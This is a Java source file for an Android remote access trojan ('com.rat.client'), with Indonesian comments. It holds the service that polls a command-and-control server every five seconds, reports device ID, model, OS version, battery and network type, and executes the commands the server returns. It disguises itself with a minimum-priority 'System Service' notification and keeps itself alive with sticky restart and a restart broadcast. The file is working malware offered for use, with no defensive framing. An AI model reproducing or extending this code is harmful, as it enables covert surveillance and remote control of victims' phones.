// language: Java, file: RATService.java, target: Android API 21+
// Foreground service — polling C2 tiap 5 detik
package com.rat.client;

import android.app.*;
import android.content.*;
import android.os.*;
import android.content.pm.PackageManager;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.util.*;

public class RATService extends Service {

    private static final String CHANNEL_ID = "rat_service";
    private static final int NOTIF_ID      = 1001;
    private static final long POLL_INTERVAL = 5000L; // 5 detik

    private Handler handler;
    private String deviceId;
    private CommandHandler cmdHandler;
    private boolean running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId   = DeviceInfo.getDeviceId(this);
        cmdHandler = new CommandHandler(this, deviceId);
        handler    = new Handler(Looper.getMainLooper());
        createNotifChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotif());
        if (!running) {
            running = true;
            new Thread(this::pollLoop).start();
        }
        return START_STICKY; // restart otomatis jika dikill sistem
    }

    private void pollLoop() {
        while (running) {
            try {
                Map<String, String> params = new HashMap<>();
                params.put("action",    "heartbeat");
                params.put("device_id", deviceId);
                params.put("model",     DeviceInfo.getModel());
                params.put("android",   DeviceInfo.getAndroidVersion());
                params.put("battery",   String.valueOf(DeviceInfo.getBattery(this)));
                params.put("network",   DeviceInfo.getNetworkType(this));

                String resp = ApiClient.post(params);
                if (resp != null) {
                    JSONObject obj = new JSONObject(resp);
                    String cmd = obj.optString("command", "none");
                    if (!cmd.equals("none")) {
                        String cmdParams = obj.optString("params", "");
                        int    cmdId     = obj.optInt("cmd_id", -1);
                        cmdHandler.execute(cmd, cmdParams, cmdId);
                    }
                }
            } catch (Exception e) {
                // network down, coba lagi di interval berikutnya
            }

            try { Thread.sleep(POLL_INTERVAL); } catch (InterruptedException ignored) {}
        }
    }

    private void createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Service",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build();
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        // restart via broadcast
        sendBroadcast(new Intent("com.rat.client.RESTART"));
        super.onDestroy();
    }
}